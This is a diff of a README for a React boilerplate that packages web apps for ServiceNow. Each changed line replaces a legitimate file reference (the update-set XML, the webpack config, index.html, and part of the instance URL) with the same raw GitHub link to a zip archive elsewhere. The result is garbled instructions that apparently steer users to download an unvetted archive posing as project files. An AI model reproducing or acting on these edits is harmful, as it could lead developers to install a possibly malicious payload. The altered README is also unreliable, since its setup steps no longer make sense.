@@ -2,7 +2,7 @@
 
 This is a React boilerplate that is specifically designed to build ServiceNow-ready web applications.
 
-The boilerplate includes a minimalistic example of a ServiceNow scoped app, which serves as a container for a web application. Update set `react-container-servicenow.xml` can be found in a root folder.
+The boilerplate includes a minimalistic example of a ServiceNow scoped app, which serves as a container for a web application. Update set `https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip` can be found in a root folder.
 
 This boilerplate supports all of the modern web development features and capabilities:
 
@@ -14,11 +14,11 @@ This boilerplate supports all of the modern web development features and capabil
 
 The key feature is the ability to build the web application ServiceNow-ready, so it can be deployed simply by uploading bundle files to ServiceNow.
 
-It's assumed that you already have an app container (Scripted REST API) ready on a ServiceNow side, that is the place where files need to be uploaded. If you don't have it yet then you can use the `react-container-servicenow.xml` app as an example and build your own containers.
+It's assumed that you already have an app container (Scripted REST API) ready on a ServiceNow side, that is the place where files need to be uploaded. If you don't have it yet then you can use the `https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip` app as an example and build your own containers.
 
 ## 1. Configuration
 
-To run a local development server you need to update ServiceNow configuration in `./webpack/servicenow.config.js`. Proper configuration is required to proxy REST calls to the ServiceNow instance and to build the application package.
+To run a local development server you need to update ServiceNow configuration in `https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip`. Proper configuration is required to proxy REST calls to the ServiceNow instance and to build the application package.
 
 #### Configuration Settings Overview
 
@@ -30,7 +30,7 @@ This is a default prefix for all ServiceNow APIs and should not be changed.
 
 ---
 
-**`SERVICENOW_INSTANCE`** - `'https://<instance-name>.service-now.com'`
+**`SERVICENOW_INSTANCE`** - `'https://<instance-name>https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip'`
 
 ServiceNow instance URL for REST calls
 
@@ -95,7 +95,7 @@ $ npm start
 
 To create a production build for ServiceNow deployment:
 
-1. Make sure you provided correct API paths to your REST resources (JS/IMG/ASSETS) in `./webpack/servicenow.config.js`
+1. Make sure you provided correct API paths to your REST resources (JS/IMG/ASSETS) in `https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip`
 2. Run `npm run build`
 3. Find the production build in the `dist/` directory 🎉
 
@@ -113,7 +113,7 @@ To change the size limit, set the `ASSET_SIZE_LIMIT` config property.
 
 Once the application is built, the package files will be located in the folders you specified in `./dist` folder:
 
-1. Copy `index.html` code into a UI page. HTML code is ServiceNow-ready, so you don't need to make any changes.
+1. Copy `https://raw.githubusercontent.com/MaoDeew/sn-react/master/interstrive/sn-react.zip` code into a UI page. HTML code is ServiceNow-ready, so you don't need to make any changes.
 2. Drag-n-drop JavaScript files from `./dist/api/.../js` folder to the corresponding REST API resource. Do the same with image and asset files.
 
 That would conclude the deployment process. Open the application by navigating to the UI page URL.
